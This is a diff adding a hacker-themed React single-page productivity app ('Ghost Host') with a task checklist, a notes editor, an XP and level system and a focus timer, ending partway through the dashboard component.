@@ -1,0 +1,1635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Host // Kernel Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    
+    <style>
+        /* Define the core mono font for the authentic terminal feel */
+        @font-face {
+            font-family: 'TerminusMono';
+            /* This is a fallback; modern systems usually render 'monospace' well */
+            src: local('Monaco'), local('Courier New'), local('DejaVu Sans Mono'), monospace;
+        }
+
+        :root {
+            --neon-green: #00ff99; /* Bright green for accents */
+            --dark-bg: #1a1a1a;
+            --mid-bg: #2d2d2d;
+            --text-color: #e0e0e0;
+        }
+
+        body {
+            font-family: 'TerminusMono', monospace;
+            color: var(--text-color);
+        }
+
+        /* Custom scrollbar to match the terminal theme */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--mid-bg);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--neon-green);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc88;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 min-h-screen">
+
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useCallback, useMemo, useRef } = React;
+
+        // --- XP CONSTANTS ---
+        const XP_TASK_COMPLETED = 25; 
+        const XP_TASK_ADDED = 5;
+        const XP_FOCUS_SESSION = 15; 
+        const XP_NOTE_REVIEW = 5;
+        
+        // --- TIMER CONSTANTS ---
+        const TIME_FOCUS = 25 * 60; // 25 minutes in seconds
+        const TIME_BREAK = 5 * 60;  // 5 minutes in seconds
+        
+        // --- STATUS CONSTANTS ---
+        const STATUS_COMPLETED = 'Completed';
+        const STATUS_IN_PROGRESS = 'In Progress';
+        const STATUS_NOT_STARTED = 'Not Started';
+
+        // --- STORAGE UTILS ---
+
+        // Helper function for local storage with error handling
+        const useLocalStorage = (key, initialValue) => {
+            const [value, setValue] = useState(() => {
+                try {
+                    const item = window.localStorage.getItem(key);
+                    return item ? JSON.parse(item) : initialValue;
+                } catch (error) {
+                    console.error("Error reading localStorage key “" + key + "”:", error);
+                    return initialValue;
+                }
+            });
+
+            const setStoredValue = (newValue) => {
+                try {
+                    const valueToStore = newValue instanceof Function ? newValue(value) : newValue;
+                    setValue(valueToStore);
+                    window.localStorage.setItem(key, JSON.stringify(valueToStore));
+                } catch (error) {
+                    console.error("Error setting localStorage key “" + key + "”:", error);
+                }
+            };
+            return [value, setStoredValue];
+        };
+
+        // --- UTILS ---
+        const getTimestamp = () => new Date().toISOString();
+        
+        const formatTime = (seconds) => {
+            const minutes = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        };
+
+        // --- COMPONENTS: SHARED UI ELEMENTS ---
+
+        const Icon = ({ name, size = 18, className = '' }) => (
+            <i className={className} data-lucide={name} style={{ width: size, height: size, minWidth: size, minHeight: size }}></i>
+        );
+
+        const Button = ({ children, onClick, className = '', disabled = false, neon = true }) => {
+            const baseClass = neon 
+                ? 'bg-gray-700 hover:bg-gray-600 border border-gray-600 transition duration-150 ease-in-out ' + 
+                  'hover:border-neon-green hover:shadow-neon-glow active:bg-gray-800'
+                : 'bg-gray-800 hover:bg-gray-700 active:bg-gray-900';
+            
+            const neonClass = neon ? 'border-neon-green/30 hover:shadow-[0_0_8px_rgba(0,255,153,0.7)]' : '';
+            const disabledClass = disabled ? 'opacity-50 cursor-not-allowed' : '';
+            
+            return (
+                <button
+                    onClick={onClick}
+                    className={`flex items-center justify-center space-x-2 px-3 py-1.5 rounded-md text-sm font-semibold ${baseClass} ${neonClass} ${className} ${disabledClass}`}
+                    disabled={disabled}
+                >
+                    {children}
+                </button>
+            );
+        };
+
+        const Modal = ({ title, children, isOpen, onClose }) => {
+            if (!isOpen) return null;
+            return (
+                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-75 backdrop-blur-sm">
+                    <div className="bg-gray-800 border-2 border-neon-green/50 rounded-md w-11/12 md:w-1/3 shadow-[0_0_20px_rgba(0,255,153,0.3)] transform transition-all scale-100 p-6">
+                        <div className="flex justify-between items-center mb-4 pb-2 border-b border-neon-green/20">
+                            <h2 className="text-xl font-bold text-neon-green uppercase">{title}</h2>
+                            <button onClick={onClose} className="text-gray-400 hover:text-neon-green transition">
+                                <Icon name="XCircle" size={24} />
+                            </button>
+                        </div>
+                        {children}
+                    </div>
+                </div>
+            );
+        };
+
+        const ConfirmationModal = ({ isOpen, message, onConfirm, onCancel }) => {
+            if (!isOpen) return null;
+            return (
+                <Modal title="Confirm Action" isOpen={isOpen} onClose={onCancel}>
+                    <p className="mb-6 text-gray-300">{message}</p>
+                    <div className="flex justify-end space-x-4">
+                        <Button onClick={onCancel} className="bg-gray-600 hover:bg-gray-500" neon={false}>Cancel</Button>
+                        <Button onClick={onConfirm} className="bg-red-700 border-red-500 hover:bg-red-600 hover:shadow-[0_0_8px_rgba(255,0,0,0.7)]">Confirm Deletion</Button>
+                    </div>
+                </Modal>
+            );
+        };
+
+        // --- COMPONENTS: SIDEBAR AND LAYOUT ---
+
+        const Sidebar = ({ currentView, setView }) => {
+            const navItems = [
+                { id: 'dashboard', name: 'Dashboard', icon: 'Home' },
+                { id: 'checklist', name: 'Checklist', icon: 'ListChecks' },
+                { id: 'notes', name: 'Notes', icon: 'Notebook' },
+                { id: 'roadmap', name: 'Roadmap', icon: 'Map' }, 
+                { id: 'focus_timer', name: 'Focus Timer', icon: 'Timer' }, 
+                { id: 'badges', name: 'Badges', icon: 'Award' },
+                { id: 'logs', name: 'Logs', icon: 'Zap' },
+                // { id: 'settings', name: 'Settings', icon: 'Settings' },
+            ];
+
+            const NavItem = ({ item }) => {
+                const isActive = currentView === item.id;
+                const baseClass = "flex items-center space-x-3 p-3 rounded-md transition duration-200";
+                const activeClass = "bg-neon-green/20 text-neon-green border-l-4 border-neon-green shadow-inner";
+                const inactiveClass = "text-gray-400 hover:bg-gray-700 hover:text-neon-green";
+
+                return (
+                    <button
+                        onClick={() => setView(item.id)}
+                        className={`${baseClass} ${isActive ? activeClass : inactiveClass}`}
+                    >
+                        <Icon name={item.icon} size={20} className="w-5 h-5" />
+                        <span className="text-base font-semibold">{item.name}</span>
+                    </button>
+                );
+            };
+
+            return (
+                <aside className="fixed left-0 top-0 h-full w-56 bg-gray-800 border-r border-neon-green/30 p-4 z-20 overflow-y-auto hidden md:block">
+                    {/* Header */}
+                    <div className="text-center mb-8 border-b border-neon-green/30 pb-4">
+                        <h1 className="text-2xl font-extrabold text-neon-green tracking-wider leading-none">
+                            <span className="block text-3xl">GHOST HOST</span>
+                            <span className="text-sm font-light text-gray-400">PROJECT CONTROL</span>
+                        </h1>
+                    </div>
+
+                    {/* Navigation */}
+                    <nav className="space-y-2">
+                        {navItems.map(item => (
+                            <NavItem key={item.id} item={item} />
+                        ))}
+                    </nav>
+
+                    {/* Status Placeholder */}
+                    <div className="absolute bottom-4 left-4 right-4 p-3 bg-gray-900 border border-gray-700 rounded-md text-center text-xs text-gray-500">
+                        SYSTEM ONLINE V1.7
+                    </div>
+                </aside>
+            );
+        };
+
+        const Header = ({ title }) => (
+            <header className="py-6 px-4 md:px-8 border-b-2 border-neon-green/30 shadow-md sticky top-0 z-10 bg-gray-900/95 backdrop-blur-sm">
+                <h1 className="text-3xl font-bold text-neon-green uppercase tracking-wide">{title}</h1>
+            </header>
+        );
+
+        // --- COMPONENTS: XP AND LEVELING ---
+
+        const getLevelInfo = (xp) => {
+            const baseXp = 100;
+            const level = Math.floor(Math.sqrt(xp / baseXp));
+            const xpForCurrentLevel = baseXp * level * level;
+            const xpForNextLevel = baseXp * (level + 1) * (level + 1);
+            const xpNeeded = xpForNextLevel - xpForCurrentLevel;
+            const xpGained = xp - xpForCurrentLevel;
+            const progressPercent = xpNeeded > 0 ? (xpGained / xpNeeded) * 100 : 100;
+
+            return { level, xpGained, xpNeeded, progressPercent };
+        };
+
+        const LevelIndicator = ({ xp }) => {
+            const { level, xpGained, xpNeeded, progressPercent } = useMemo(() => getLevelInfo(xp), [xp]);
+
+            return (
+                <div className="p-4 bg-gray-800 rounded-md border border-neon-green/30 shadow-lg w-full">
+                    <div className="flex justify-between items-center mb-2">
+                        <span className="text-lg font-bold text-neon-green">Lvl {level}</span>
+                        <span className="text-sm text-gray-400">
+                            {xpGained}/{xpNeeded} XP
+                        </span>
+                    </div>
+                    <div className="w-full bg-gray-700 rounded-full h-2.5">
+                        <div
+                            className="h-2.5 rounded-full bg-neon-green shadow-neon-glow"
+                            style={{ width: `${progressPercent}%` }}
+                        ></div>
+                    </div>
+                    <div className="text-xs text-gray-500 mt-1 text-right">
+                        STATUS: {level < 5 ? 'Recruit' : level < 10 ? 'Agent' : 'Master Hacker'}
+                    </div>
+                </div>
+            );
+        };
+
+        // --- COMPONENTS: CHECKLIST MODULE ---
+        
+        const ChecklistView = ({ xp, setXp, tasks, setTasks, domains }) => {
+            const [isModalOpen, setIsModalOpen] = useState(false);
+            const [title, setTitle] = useState('');
+            const [domain, setDomain] = useState(domains[0] || 'General');
+            const [filterDomain, setFilterDomain] = useState('All');
+            const [filterStatus, setFilterStatus] = useState('All');
+            const [sortBy, setSortBy] = useState('dateAddedDesc');
+
+            // --- Handlers ---
+            const handleAddTask = () => {
+                if (!title.trim()) return;
+
+                const newTask = {
+                    id: (crypto.randomUUID ? crypto.randomUUID() : ('id-' + Math.random().toString(36).slice(2))),
+                    title: title.trim(),
+                    domain: domain,
+                    status: STATUS_NOT_STARTED,
+                    dateAdded: getTimestamp(),
+                    dateUpdated: getTimestamp(),
+                };
+
+                setTasks(prev => [newTask, ...prev]);
+                setXp(prev => prev + XP_TASK_ADDED);
+                setTitle('');
+                setIsModalOpen(false);
+            };
+
+            const handleDeleteTask = (taskId) => {
+                setTasks(prev => prev.filter(task => task.id !== taskId));
+            };
+
+            const handleToggleStatus = (taskId) => {
+                setTasks(prev => {
+                    const taskIndex = prev.findIndex(t => t.id === taskId);
+                    if (taskIndex === -1) return prev;
+
+                    const task = prev[taskIndex];
+                    let newStatus;
+                    let xpChange = 0;
+
+                    if (task.status === STATUS_NOT_STARTED) {
+                        newStatus = STATUS_IN_PROGRESS;
+                    } else if (task.status === STATUS_IN_PROGRESS) {
+                        newStatus = STATUS_COMPLETED;
+                        xpChange = XP_TASK_COMPLETED;
+                    } else {
+                        newStatus = STATUS_NOT_STARTED;
+                        xpChange = -XP_TASK_COMPLETED; // Remove XP if un-completing
+                    }
+
+                    if (xpChange !== 0) {
+                        setXp(currentXp => Math.max(0, currentXp + xpChange));
+                    }
+
+                    const updatedTask = { ...task, status: newStatus, dateUpdated: getTimestamp() };
+                    const newTasks = [...prev];
+                    newTasks[taskIndex] = updatedTask;
+                    return newTasks;
+                });
+            };
+
+            // --- Filtering and Sorting ---
+            const filteredAndSortedTasks = useMemo(() => {
+                let list = tasks;
+
+                // 1. Filtering
+                if (filterDomain !== 'All') {
+                    list = list.filter(task => task.domain === filterDomain);
+                }
+                if (filterStatus !== 'All') {
+                    list = list.filter(task => task.status === filterStatus);
+                }
+
+                // 2. Sorting (always by dateAdded for now, but respect filter)
+                list = [...list].sort((a, b) => {
+                    if (sortBy === 'dateAddedDesc') {
+                        return new Date(b.dateAdded) - new Date(a.dateAdded);
+                    }
+                    if (sortBy === 'dateAddedAsc') {
+                        return new Date(a.dateAdded) - new Date(b.dateAdded);
+                    }
+                    // Simple title sort for example
+                    if (sortBy === 'titleAsc') {
+                        return a.title.localeCompare(b.title);
+                    }
+                    return 0;
+                });
+
+                return list;
+            }, [tasks, filterDomain, filterStatus, sortBy]);
+
+            const TaskItem = ({ task }) => {
+                const getStatusStyle = (status) => {
+                    switch (status) {
+                        case STATUS_COMPLETED: return 'bg-green-700 text-white';
+                        case STATUS_IN_PROGRESS: return 'bg-yellow-600 text-black';
+                        case STATUS_NOT_STARTED: return 'bg-gray-600 text-white';
+                        default: return 'bg-gray-600 text-white';
+                    }
+                };
+
+                const getStatusIcon = (status) => {
+                    switch (status) {
+                        case STATUS_COMPLETED: return <Icon name="CheckCircle" className="text-green-300" />;
+                        case STATUS_IN_PROGRESS: return <Icon name="Clock" className="text-yellow-300" />;
+                        case STATUS_NOT_STARTED: return <Icon name="XCircle" className="text-gray-400" />;
+                        default: return <Icon name="XCircle" className="text-gray-400" />;
+                    }
+                };
+                
+                const toggleButtonText = task.status === STATUS_COMPLETED ? 'Mark Not Started' : 
+                                         task.status === STATUS_IN_PROGRESS ? 'Mark Completed' : 'Mark In Progress';
+                
+                const toggleButtonIcon = task.status === STATUS_IN_PROGRESS ? "CheckCircle" : "Clock";
+
+                return (
+                    <div className="flex items-center justify-between p-4 bg-gray-700/70 border border-neon-green/20 rounded-md shadow-inner hover:bg-gray-700 transition">
+                        <div className="flex items-center space-x-4 min-w-0">
+                            {getStatusIcon(task.status)}
+                            <div className="min-w-0">
+                                <h3 className={`text-lg font-semibold truncate ${task.status === STATUS_COMPLETED ? 'line-through text-gray-500' : 'text-white'}`}>
+                                    {task.title}
+                                </h3>
+                                <p className="text-xs text-gray-400">
+                                    Domain: <span className="font-mono text-neon-green">{task.domain}</span> | 
+                                    Added: {new Date(task.dateAdded).toLocaleDateString()}
+                                </p>
+                            </div>
+                        </div>
+                        
+                        <div className="flex space-x-3 items-center">
+                            <span className={`px-2 py-0.5 text-xs font-bold rounded ${getStatusStyle(task.status)} hidden sm:block`}>
+                                {task.status}
+                            </span>
+                            <Button 
+                                onClick={() => handleToggleStatus(task.id)} 
+                                className="text-xs px-3 py-1 bg-gray-600 hover:bg-gray-500" 
+                                neon={false}
+                            >
+                                <Icon name={toggleButtonIcon} size={16} />
+                                <span className="hidden md:inline">{toggleButtonText}</span>
+                            </Button>
+                            <Button onClick={() => handleDeleteTask(task.id)} className="text-red-400 bg-gray-600 hover:bg-red-700 border-red-500" neon={false}>
+                                <Icon name="Trash2" size={16} />
+                            </Button>
+                        </div>
+                    </div>
+                );
+            };
+
+
+            return (
+                <>
+                    <Header title="Checklist (Targets)" />
+                    <div className="p-4 md:p-8">
+                        <div className="flex flex-col md:flex-row justify-between items-center mb-6 space-y-4 md:space-y-0">
+                            <Button onClick={() => setIsModalOpen(true)} className="w-full md:w-auto">
+                                <Icon name="Plus" size={20} />
+                                <span>[+ NEW TARGET]</span>
+                            </Button>
+                            
+                            <div className="flex space-x-4 w-full md:w-auto">
+                                {/* Domain Filter */}
+                                <select 
+                                    value={filterDomain} 
+                                    onChange={(e) => setFilterDomain(e.target.value)}
+                                    className="bg-gray-700 border border-gray-600 text-white rounded-md p-2 text-sm focus:ring-neon-green focus:border-neon-green"
+                                >
+                                    <option value="All">All Domains</option>
+                                    {domains.map(d => <option key={d} value={d}>{d}</option>)}
+                                </select>
+
+                                {/* Status Filter */}
+                                <select 
+                                    value={filterStatus} 
+                                    onChange={(e) => setFilterStatus(e.target.value)}
+                                    className="bg-gray-700 border border-gray-600 text-white rounded-md p-2 text-sm focus:ring-neon-green focus:border-neon-green"
+                                >
+                                    <option value="All">All Statuses</option>
+                                    <option value={STATUS_NOT_STARTED}>{STATUS_NOT_STARTED}</option>
+                                    <option value={STATUS_IN_PROGRESS}>{STATUS_IN_PROGRESS}</option>
+                                    <option value={STATUS_COMPLETED}>{STATUS_COMPLETED}</option>
+                                </select>
+                                
+                                {/* Sort By */}
+                                <select 
+                                    value={sortBy} 
+                                    onChange={(e) => setSortBy(e.target.value)}
+                                    className="bg-gray-700 border border-gray-600 text-white rounded-md p-2 text-sm focus:ring-neon-green focus:border-neon-green"
+                                >
+                                    <option value="dateAddedDesc">Newest First</option>
+                                    <option value="dateAddedAsc">Oldest First</option>
+                                    <option value="titleAsc">Title (A-Z)</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        {/* Task List */}
+                        <div className="space-y-3">
+                            {filteredAndSortedTasks.length > 0 ? (
+                                filteredAndSortedTasks.map(task => (
+                                    <TaskItem key={task.id} task={task} />
+                                ))
+                            ) : (
+                                <p className="text-center text-gray-500 p-8 border border-dashed border-gray-700 rounded-md">
+                                    No targets found matching current filters. Time to focus on a new mission.
+                                </p>
+                            )}
+                        </div>
+                    </div>
+
+                    {/* Add Task Modal */}
+                    <Modal title="Add New Target" isOpen={isModalOpen} onClose={() => setIsModalOpen(false)}>
+                        <div className="space-y-4">
+                            <input
+                                type="text"
+                                value={title}
+                                onChange={(e) => setTitle(e.target.value)}
+                                placeholder="Target Description (e.g., Learn SQL Injection Basics)"
+                                className="w-full bg-gray-900 border border-gray-600 rounded-sm p-3 text-white placeholder-gray-500 focus:ring-1 focus:ring-neon-green"
+                            />
+                            <select 
+                                value={domain} 
+                                onChange={(e) => setDomain(e.target.value)}
+                                className="w-full bg-gray-900 border border-gray-600 text-white rounded-sm p-3 focus:ring-1 focus:ring-neon-green"
+                            >
+                                {domains.map(d => <option key={d} value={d}>{d}</option>)}
+                            </select>
+                            <Button onClick={handleAddTask} disabled={!title.trim()} className="w-full">
+                                <Icon name="Plus" size={18} />
+                                <span>Add Target</span>
+                            </Button>
+                        </div>
+                    </Modal>
+                </>
+            );
+        };
+
+        // --- COMPONENTS: NOTES MODULE ---
+        
+        const NotesView = ({ notes, setNotes }) => {
+            const [selectedNote, setSelectedNote] = useState(null);
+            const [isEditing, setIsEditing] = useState(false);
+            const [editTitle, setEditTitle] = useState('');
+            const [editContent, setEditContent] = useState('');
+            const [isNewNoteModalOpen, setIsNewNoteModalOpen] = useState(false);
+            const [searchQuery, setSearchQuery] = useState('');
+            const [sortBy, setSortBy] = useState('dateUpdatedDesc');
+            const [showStarred, setShowStarred] = useState(false);
+            const [isConfirmModalOpen, setIsConfirmModalOpen] = useState(false);
+            const [noteToDelete, setNoteToDelete] = useState(null);
+
+            // --- Handlers ---
+            
+            const handleAddNote = (title, content) => {
+                if (!title.trim() || !content.trim()) return;
+
+                const newNote = {
+                    id: (crypto.randomUUID ? crypto.randomUUID() : ('id-' + Math.random().toString(36).slice(2))),
+                    title: title.trim(),
+                    content: content.trim(),
+                    starred: false,
+                    dateCreated: getTimestamp(),
+                    dateUpdated: getTimestamp(),
+                };
+
+                setNotes(prev => [newNote, ...prev]);
+                setSelectedNote(newNote);
+                setIsNewNoteModalOpen(false);
+            };
+            
+            const handleStartNewNote = () => {
+                setEditTitle('');
+                setEditContent('');
+                setIsNewNoteModalOpen(true);
+            };
+
+            const handleSaveNote = () => {
+                if (!selectedNote || !editTitle.trim() || !editContent.trim()) return;
+
+                setNotes(prev => {
+                    return prev.map(note => 
+                        note.id === selectedNote.id 
+                            ? { 
+                                ...note, 
+                                title: editTitle.trim(), 
+                                content: editContent.trim(), 
+                                dateUpdated: getTimestamp() 
+                            } 
+                            : note
+                    );
+                });
+
+                setSelectedNote(prev => ({ 
+                    ...prev, 
+                    title: editTitle.trim(), 
+                    content: editContent.trim(),
+                    dateUpdated: getTimestamp()
+                }));
+
+                setIsEditing(false);
+            };
+            
+            const handleToggleStar = (noteId) => {
+                setNotes(prev => {
+                    const newNotes = prev.map(note =>
+                        note.id === noteId ? { ...note, starred: !note.starred, dateUpdated: getTimestamp() } : note
+                    );
+                    // Update the selected note immediately if it's the one being starred
+                    if (selectedNote && selectedNote.id === noteId) {
+                        setSelectedNote(newNotes.find(n => n.id === noteId));
+                    }
+                    return newNotes;
+                });
+            };
+
+            const confirmDelete = (noteId) => {
+                setNoteToDelete(noteId);
+                setIsConfirmModalOpen(true);
+            };
+
+            const handleDeleteConfirmed = () => {
+                setNotes(prev => prev.filter(note => note.id !== noteToDelete));
+                if (selectedNote && selectedNote.id === noteToDelete) {
+                    setSelectedNote(null);
+                }
+                setIsConfirmModalOpen(false);
+                setNoteToDelete(null);
+            };
+            
+            const handleSelectNote = (note) => {
+                setSelectedNote(note);
+                setIsEditing(false);
+            };
+            
+            const handleEditNote = (note) => {
+                setSelectedNote(note);
+                setEditTitle(note.title);
+                setEditContent(note.content);
+                setIsEditing(true);
+            };
+
+
+            // --- Filtering and Sorting ---
+            const filteredAndSortedNotes = useMemo(() => {
+                let list = notes;
+
+                // 1. Filtering by Starred
+                if (showStarred) {
+                    list = list.filter(note => note.starred);
+                }
+
+                // 2. Filtering by Search Query (Full-Text Search)
+                if (searchQuery.trim()) {
+                    const query = searchQuery.toLowerCase();
+                    list = list.filter(note => 
+                        note.title.toLowerCase().includes(query) || 
+                        note.content.toLowerCase().includes(query)
+                    );
+                }
+
+                // 3. Sorting
+                list = [...list].sort((a, b) => {
+                    switch (sortBy) {
+                        case 'dateUpdatedDesc':
+                            return new Date(b.dateUpdated) - new Date(a.dateUpdated);
+                        case 'dateUpdatedAsc':
+                            return new Date(a.dateUpdated) - new Date(b.dateUpdated);
+                        case 'titleAsc':
+                            return a.title.localeCompare(b.title);
+                        case 'dateCreatedDesc':
+                            return new Date(b.dateCreated) - new Date(a.dateCreated);
+                        default:
+                            return 0;
+                    }
+                });
+
+                return list;
+            }, [notes, searchQuery, sortBy, showStarred]);
+            
+            // Set initial selected note if none is selected and list exists
+            useEffect(() => {
+                if (!selectedNote && filteredAndSortedNotes.length > 0) {
+                    setSelectedNote(filteredAndSortedNotes[0]);
+                }
+                // If the selected note was deleted or filtered out, clear selection
+                if (selectedNote && !filteredAndSortedNotes.some(n => n.id === selectedNote.id)) {
+                    setSelectedNote(filteredAndSortedNotes[0] || null);
+                }
+            }, [filteredAndSortedNotes, selectedNote]);
+
+            // --- Sub-Components ---
+
+            const NoteListItem = ({ note }) => (
+                <div 
+                    onClick={() => handleSelectNote(note)}
+                    className={`p-3 rounded-md border cursor-pointer transition ${
+                        selectedNote?.id === note.id 
+                            ? 'bg-neon-green/30 border-neon-green text-white' 
+                            : 'bg-gray-700/50 border-gray-600 hover:bg-gray-700'
+                    }`}
+                >
+                    <div className="flex items-center justify-between">
+                        <h4 className={`text-md font-bold truncate ${note.starred ? 'text-yellow-400' : 'text-white'}`}>
+                            {note.starred && <Icon name="Star" size={16} className="inline mr-1" />}
+                            {note.title}
+                        </h4>
+                        <span className="text-xs text-gray-400 min-w-max">
+                            {new Date(note.dateUpdated).toLocaleDateString()}
+                        </span>
+                    </div>
+                </div>
+            );
+            
+            const NewNoteModal = ({ isOpen, onClose }) => {
+                const [newTitle, setNewTitle] = useState('');
+                const [newContent, setNewContent] = useState('');
+                
+                const handleCreate = () => {
+                    handleAddNote(newTitle, newContent);
+                    setNewTitle('');
+                    setNewContent('');
+                };
+
+                return (
+                    <Modal title="Create New Note" isOpen={isOpen} onClose={onClose}>
+                        <div className="space-y-4">
+                            <input
+                                type="text"
+                                value={newTitle}
+                                onChange={(e) => setNewTitle(e.target.value)}
+                                placeholder="Note Title (e.g., Target X Nmap Scan Results)"
+                                className="w-full bg-gray-900 border border-gray-600 rounded-sm p-3 text-white placeholder-gray-500 focus:ring-1 focus:ring-neon-green"
+                            />
+                            <textarea
+                                value={newContent}
+                                onChange={(e) => setNewContent(e.target.value)}
+                                placeholder="Note content..."
+                                rows="8"
+                                className="w-full bg-gray-900 border border-gray-600 rounded-sm p-3 text-white placeholder-gray-500 focus:ring-1 focus:ring-neon-green resize-y"
+                            />
+                            <Button onClick={handleCreate} disabled={!newTitle.trim() || !newContent.trim()} className="w-full">
+                                <Icon name="Plus" size={18} />
+                                <span>Save Note</span>
+                            </Button>
+                        </div>
+                    </Modal>
+                );
+            };
+
+            return (
+                <>
+                    <Header title="Notes (Knowledge Base)" />
+                    <div className="flex h-[calc(100vh-100px)] overflow-hidden"> 
+                        {/* Notes List Sidebar */}
+                        <div className="w-full md:w-1/3 p-4 md:p-8 border-r border-neon-green/30 bg-gray-800/50 flex flex-col">
+                            <Button onClick={handleStartNewNote} className="mb-4 w-full text-sm">
+                                <Icon name="Plus" size={18} />
+                                <span>[+ NEW NOTE]</span>
+                            </Button>
+
+                            {/* Controls */}
+                            <div className="mb-4 space-y-3">
+                                <div className="relative">
+                                    <input
+                                        type="text"
+                                        value={searchQuery}
+                                        onChange={(e) => setSearchQuery(e.target.value)}
+                                        placeholder="Search notes (Title/Content)"
+                                        className="w-full bg-gray-900 border border-gray-600 rounded-sm p-3 pl-10 text-white placeholder-gray-500 focus:ring-1 focus:ring-neon-green"
+                                    />
+                                    <Icon name="Search" size={18} className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500" />
+                                </div>
+                                <div className="flex space-x-2">
+                                    <select 
+                                        value={sortBy} 
+                                        onChange={(e) => setSortBy(e.target.value)}
+                                        className="flex-1 bg-gray-700 border border-gray-600 text-white rounded-md p-2 text-sm focus:ring-neon-green focus:border-neon-green"
+                                    >
+                                        <option value="dateUpdatedDesc">Updated (Newest)</option>
+                                        <option value="dateUpdatedAsc">Updated (Oldest)</option>
+                                        <option value="titleAsc">Title (A-Z)</option>
+                                        <option value="dateCreatedDesc">Created (Newest)</option>
+                                    </select>
+                                    <Button 
+                                        onClick={() => setShowStarred(prev => !prev)} 
+                                        className={`flex-shrink-0 ${showStarred ? 'bg-yellow-600 border-yellow-500 text-yellow-300' : 'bg-gray-700 border-gray-600'}`}
+                                        neon={showStarred}
+                                    >
+                                        <Icon name="Star" size={18} />
+                                        <span className="hidden sm:inline">{showStarred ? 'Starred Only' : 'All Notes'}</span>
+                                    </Button>
+                                </div>
+                            </div>
+                            
+                            {/* Note List */}
+                            <div className="flex-1 overflow-y-auto space-y-2 pr-1">
+                                {filteredAndSortedNotes.length > 0 ? (
+                                    filteredAndSortedNotes.map(note => (
+                                        <NoteListItem key={note.id} note={note} />
+                                    ))
+                                ) : (
+                                    <p className="text-center text-gray-500 p-8 border border-dashed border-gray-700 rounded-md">
+                                        No notes found.
+                                    </p>
+                                )}
+                            </div>
+                        </div>
+
+                        {/* Note Editor/Viewer */}
+                        <div className="hidden md:block w-2/3 p-4 md:p-8 flex flex-col bg-gray-900/50">
+                            {!selectedNote ? (
+                                <p className="text-center text-gray-500 p-20">
+                                    Select a note from the left or create a new one to begin.
+                                </p>
+                            ) : (
+                                <div className="flex flex-col h-full space-y-4">
+                                    <div className="flex justify-between items-center pb-3 border-b border-neon-green/30">
+                                        {isEditing ? (
+                                            <input
+                                                type="text"
+                                                value={editTitle}
+                                                onChange={(e) => setEditTitle(e.target.value)}
+                                                className="text-2xl font-bold bg-transparent border-none text-neon-green focus:ring-0 w-3/4"
+                                            />
+                                        ) : (
+                                            <h2 className="text-2xl font-bold text-neon-green">
+                                                {selectedNote.starred && <Icon name="Star" size={24} className="inline mr-2 text-yellow-400" />}
+                                                {selectedNote.title}
+                                            </h2>
+                                        )}
+                                        <div className="flex space-x-2">
+                                            <Button 
+                                                onClick={() => handleToggleStar(selectedNote.id)}
+                                                className={`text-sm ${selectedNote.starred ? 'bg-yellow-600 border-yellow-500 hover:bg-yellow-700' : 'bg-gray-700 border-gray-600'}`}
+                                                neon={!selectedNote.starred}
+                                            >
+                                                <Icon name={selectedNote.starred ? 'StarOff' : 'Star'} size={18} />
+                                                <span className="hidden lg:inline">{selectedNote.starred ? 'Unstar' : 'Star'}</span>
+                                            </Button>
+                                            
+                                            {isEditing ? (
+                                                <Button onClick={handleSaveNote} className="bg-green-700 border-green-500 hover:bg-green-600">
+                                                    <Icon name="CheckCircle" size={18} />
+                                                    <span>Save</span>
+                                                </Button>
+                                            ) : (
+                                                <Button onClick={() => handleEditNote(selectedNote)}>
+                                                    <Icon name="Edit" size={18} />
+                                                    <span>Edit</span>
+                                                </Button>
+                                            )}
+                                            
+                                            <Button onClick={() => confirmDelete(selectedNote.id)} className="bg-red-700 border-red-500 hover:bg-red-600">
+                                                <Icon name="Trash2" size={18} />
+                                            </Button>
+                                        </div>
+                                    </div>
+                                    
+                                    <p className="text-xs text-gray-500">
+                                        Created: {new Date(selectedNote.dateCreated).toLocaleString()} | 
+                                        Updated: {new Date(selectedNote.dateUpdated).toLocaleString()}
+                                    </p>
+
+                                    {isEditing ? (
+                                        <textarea
+                                            value={editContent}
+                                            onChange={(e) => setEditContent(e.target.value)}
+                                            rows="20"
+                                            className="flex-1 w-full bg-gray-900 border border-gray-600 rounded-sm p-4 text-white placeholder-gray-500 focus:ring-1 focus:ring-neon-green resize-none text-sm"
+                                        />
+                                    ) : (
+                                        <div className="flex-1 overflow-y-auto p-4 bg-gray-900 rounded-sm border border-gray-800 whitespace-pre-wrap text-sm">
+                                            {selectedNote.content}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
+                        </div>
+                    </div>
+                    <NewNoteModal isOpen={isNewNoteModalOpen} onClose={() => setIsNewNoteModalOpen(false)} />
+                    <ConfirmationModal 
+                        isOpen={isConfirmModalOpen} 
+                        message="Are you sure you want to permanently delete this note? This action cannot be undone."
+                        onConfirm={handleDeleteConfirmed}
+                        onCancel={() => setIsConfirmModalOpen(false)}
+                    />
+                </>
+            );
+        };
+
+
+        // --- COMPONENTS: PLACEHOLDERS ---
+        
+        const DashboardView = ({ xp }) => {
+            const { level, progressPercent } = useMemo(() => getLevelInfo(xp), [xp]);
+            
+            return (
+                <>
+                    <Header title="System Dashboard" />
+                    <div className="p-4 md:p-8 grid grid-cols-1 lg:grid-cols-3 gap-8">
+                        {/* Status/Leveling Card */}
+                        <div className="lg:col-span-2 space-y-6">
+                            <LevelIndicator xp={xp} />
+                            
+                            {/* Mission Briefing */}
